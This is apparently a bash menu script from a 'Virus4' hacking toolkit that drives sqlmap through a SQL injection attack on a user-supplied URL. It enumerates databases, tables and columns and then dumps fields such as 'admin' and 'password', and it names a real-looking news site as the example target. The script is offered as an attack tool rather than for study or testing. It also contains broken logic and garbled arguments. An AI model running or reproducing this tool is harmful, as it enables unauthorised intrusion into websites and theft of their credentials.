colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'

echo -e "$yellow"
figlet -f big "Virus4 "
echo -e " $red                    [0]exit"
echo -e ""
echo -e " $blue                   [1]start "
echo ""
read -p "     nomber -------->  " vv
if [ "$vv" -eq "0"  ]; then
cd $HOME/Virus4
python2 Virus4.py
elif [ "$vv" -eq "1" ]; then
echo -e "$green"     
figlet -f big " SQL DZ"
echo -e " $green Amer $blue Amerr $red Hnancha $purple Virus4 "
echo -e " | $green --- $red exomple --------------------------------------------|"
echo -e " | $blue URL :$green http://masrelyoumwa.com/controllers/article.php?id |"

echo -e " | $green----------------------------------------------------------|"     
echo -e "$red"
read -p "                  URL----->  " url

cd $HOME/sqlmap
python2 sqlmap.py -u $url --dbs s-- level=3 --risk=3 --batch
fi

echo -e "$blue                         [0]exit"
echo -e ""
echo -e  "$green                       [1]Continue"
echo -e ""
read -p "       nomber -------->  " bb
if [ "$bb" -eq "0"  ]; then
cd $HOME/Virus4
python2 Virus4.py


elif [ "$bb" -eq "1"  ]; then
echo -e "$blue" 
figlet -f big " DATAASE"
echo -e " | $green --- $red exomple --------------------------------------------|"
echo -e " | $blue URL :$green http://masrelyoumwa.com/controllers/article.php?id |"
                                   
echo -e " | $purple DATAASE : $red information_schema                            |"
echo -e " | $green----------------------------------------------------------|"
echo -e "$red " 
read -p "                URL----->  " url
read -p "           DATAAASE----->  " dataase
cd $HOME/sqlmap

python2 sqlmap.py -u $url -D $dataase --tables --level=3 --risk=3 --batch


fi


echo -e " $blue                   [0]exit"
echo -e ""       
echo -e " $green                  [1]Continue"
echo -e ""
echo -e "$purple"
read -p "     nomber -------->  " aa
if [ "$aa" -eq "0"  ]; then
cd $HOME/Virus4
python2 Virus4.py

elif [ "$bb" -eq "1"  ]; then
echo -e "$cyan"
figlet -f big " TABLE"
echo -e "$green" 
echo -e " | $green --- $red exomple --------------------------------------------|"
echo -e " | $blue URL :$green http://masrelyoumwa.com/controllers/article.php?id |"

echo -e " | $purple DATAASE : $red information_schema                            |"
echo -e " | $red TABLE : user                                             |"
echo -e " | $green----------------------------------------------------------|"
read -p "               URL----->  " url
read -p "          DATAAASE----->  " dataase
read -p "             TABLE----->  " table
cd $HOME/sqlmap

python2 sqlmap.py -u $url -D $dataase -T $table --columns --level=3 --risk=3 --batch

fi
echo -e " $blue"
echo "                            [0]exit"
echo -e " $green "
echo "                            [1]Continue"
read -p "      nomber -------->  " amer

if [ "$amer" -eq "0"  ]; then
cd $HOME/Virus4
python2 Virus4.py

elif [ "$bb" -eq "1"  ]; then

echo -e " $purple"
figlet -f big " COLUMN"
echo -e "$green "
echo -e " | $green --- $red exomple --------------------------------------------|"
echo -e " | $blue URL :$green http://masrelyoumwa.com/controllers/article.php?id |"

echo -e " | $purple DATAASE : $red information_schema                            |"
echo -e " | $red TABLE :   user                                           |"
echo -e " | $cyan COLLUMN : admin $ password                               |"

echo -e " | $green----------------------------------------------------------|"
read -p "                  URL----->  " url
read -p "             DATAAASE----->  " dataase
read -p "                TABLE----->  " table
read -p "               COLUMN----->  " column


cd $HOME/sqlmap
python2 sqlmap.py -u $url -D $dataase -T $table -C $column --dump --level=3 --risk=3 --batch

fi

read -p "                              ------->entar<------"
cd $HOME/Virus4
python2 Virus4.py


